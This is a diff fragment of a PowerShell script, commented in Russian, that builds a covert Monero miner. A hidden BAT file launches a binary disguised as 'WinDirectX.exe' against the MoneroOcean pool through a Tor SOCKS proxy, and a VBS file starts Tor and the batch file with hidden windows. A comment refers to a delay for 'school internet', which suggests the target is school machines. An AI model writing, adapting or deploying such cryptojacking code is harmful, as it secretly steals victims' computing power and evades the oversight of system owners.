@@ -89,16 +89,17 @@ if (!(Test-Path "$path\tor.exe")) {
 }
 
 
-# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (С ЗАЩИТОЙ ОТ ДУБЛЕЙ)
-# 6a. Создаем BAT-файл с проверкой запущенного процесса
+
+# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (С ЛОГ-ФАЙЛОМ И ЗАЩИТОЙ)
+# 6a. Создаем BAT-файл с проверкой процесса и записью лога
 $cmd = "@echo off`n" +
        "tasklist /FI `"IMAGENAME eq WinDirectX.exe`" 2>NUL | find /I /N `"WinDirectX.exe`">NUL`n" +
-       "if %ERRORLEVEL%==0 exit`n" + # Если майнер уже есть — выходим
-       "timeout /t 30 /nobreak >nul`n" +
-       "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
+       "if %ERRORLEVEL%==0 exit`n" +
+       "timeout /t 30 /nobreak >nul`n" + # Задержка 30 сек для школьного инета
+       "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
-# 6b. Создаем VBS
+# 6b. Создаем VBS (запуск Tor и Батника)
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`n" +
        "WshShell.Run `"$path\tor.exe`", 0, False`n" +
        "WshShell.Run `"$path\run_cache.bat`", 0, False"
